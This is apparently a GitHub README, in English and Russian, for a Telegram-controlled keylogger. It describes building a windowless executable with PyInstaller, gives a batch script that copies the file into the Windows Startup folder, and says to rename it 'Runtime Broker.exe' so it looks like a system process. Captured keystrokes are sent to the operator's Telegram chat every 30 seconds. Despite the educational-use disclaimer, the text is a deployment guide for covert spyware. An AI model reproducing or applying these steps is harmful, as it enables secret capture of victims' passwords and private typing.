# Keylogger-Bot

A Telegram bot that logs keystrokes and automatically sends the log file to the admin every 30 seconds. Designed for educational and monitoring purposes only.

Телеграм-бот для записи нажатий клавиш с автоматической отправкой логов администратору каждые 30 секунд. Предназначен только для образовательных целей.

## ⚠️ Disclaimer / Предупреждение

This tool is intended for **educational purposes only**. Using keyloggers without the explicit consent of the device owner is **illegal** in most jurisdictions. The author is not responsible for any misuse of this software. Only use this on devices you own or have explicit permission to monitor.

Этот инструмент предназначен **только для образовательных целей**. Использование кейлоггеров без явного согласия владельца устройства **незаконно** в большинстве стран. Автор не несет ответственности за неправомерное использование данного программного обеспечения. Используйте только на устройствах, которыми вы владеете или на мониторинг которых получили разрешение.

## Features / Возможности

- Background keystroke logging using `pynput`
- Automatic log file sending every 30 seconds via Telegram
- Single executable build with PyInstaller
- Autostart setup script for Windows
- Minimal resource usage

- Фоновый сбор нажатий клавиш через `pynput`
- Автоматическая отправка логов каждые 30 секунд через Telegram
- Сборка в единый исполняемый файл с помощью PyInstaller
- Скрипт для добавления в автозагрузку Windows
- Минимальное потребление ресурсов

## Commands / Команды

| Command | Description |
|---------|-------------|
| `/start` | Start the bot and confirm logging is active |

| Команда | Описание |
|---------|----------|
| `/start` | Запуск бота и подтверждение активного логирования |

## Installation / Установка

### Prerequisites / Требования
- Python 3.8+
- Telegram Bot Token (from [@BotFather](https://t.me/BotFather))
- Your Telegram User ID

- Токен Телеграм бота (от [@BotFather](https://t.me/BotFather))
- Ваш ID пользователя в Телеграм

### Steps / Шаги

1. Clone the repository / Клонируйте репозиторий:
   ```bash
   git clone https://github.com/elyr1n/Keylogger-Bot.git
   cd Keylogger-Bot
   ```

2. Install dependencies / Установите зависимости:
   ```bash
   pip install -r requirements.txt
   ```

3. Create a `.env` file in the project root / Создайте файл `.env` в корне проекта:
   ```env
   TOKEN=your_telegram_bot_token
   CHAT_ID=your_telegram_user_id
   ```

4. Run the bot / Запустите бота:
   ```bash
   python keylogger.py
   ```

## Building Executable / Сборка исполняемого файла

Use PyInstaller to create a standalone executable file:

Используйте PyInstaller для создания standalone-исполняемого файла:

```bash
pyinstaller -F -w --noconsole --clean --onefile --windowed -i "NONE" --add-data ".env:." keylogger.py
```

The executable will be created in the `dist` folder.

Исполняемый файл будет создан в папке `dist`.

## Autostart Setup / Автозагрузка

The `autostart.bat` script copies the executable to the Windows Startup folder:

Скрипт `autostart.bat` копирует исполняемый файл в папку автозагрузки Windows:

```batch
@echo off
setlocal enabledelayedexpansion
chcp 1251 >nul

set FILENAME=Runtime Broker.exe
set "CURRENT_PATH=%~dp0"
set "STARTUP_PATH=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

if exist "%CURRENT_PATH%%FILENAME%" (
    copy "%CURRENT_PATH%%FILENAME%" "%STARTUP_PATH%\" >nul
)
```

**Important:** The executable must be renamed to `Runtime Broker.exe` for the autostart script to work correctly.

**Важно:** Исполняемый файл должен быть переименован в `Runtime Broker.exe` для корректной работы скрипта автозагрузки.

## Project Structure / Структура проекта

```
Keylogger-Bot/
├── keylogger.py          # Main bot and keylogger logic / Основной код бота и кейлоггера
├── autostart.bat         # Windows autostart setup script / Скрипт добавления в автозагрузку
├── pyinstaller.txt       # PyInstaller build command / Команда сборки PyInstaller
├── .env.example          # Example environment file / Пример файла окружения
└── requirements.txt      # Python dependencies / Зависимости Python
```

## How It Works / Принцип работы

1. The bot starts and begins listening for keyboard events in the background
2. Keystrokes are stored in a buffer
3. Every 30 seconds, the buffer is sent to the admin as a text file via Telegram
4. The buffer is cleared after each send
5. Special keys (Enter, Space, Backspace, etc.) are logged in brackets: `[Key.enter]`

1. Бот запускается и начинает прослушивать клавиатурные события в фоне
2. Нажатия клавиш сохраняются в буфер
3. Каждые 30 секунд содержимое буфера отправляется администратору в виде текстового файла
4. После отправки буфер очищается
5. Специальные клавиши (Enter, Space, Backspace и т.д.) логируются в квадратных скобках: `[Key.enter]`

## Dependencies / Зависимости

- `aiogram` - Telegram Bot API framework / фреймворк для работы с Telegram Bot API
- `pynput` - Keyboard event listener / обработчик событий клавиатуры
- `python-dotenv` - Environment variable management / управление переменными окружения

## Configuration / Конфигурация

| Variable | Description |
|----------|-------------|
| `TOKEN` | Telegram bot token from @BotFather |
| `CHAT_ID` | Your Telegram user ID (where logs will be sent) |

| Переменная | Описание |
|------------|----------|
| `TOKEN` | Токен Телеграм бота от @BotFather |
| `CHAT_ID` | Ваш ID пользователя в Телеграм (куда будут отправляться логи) |
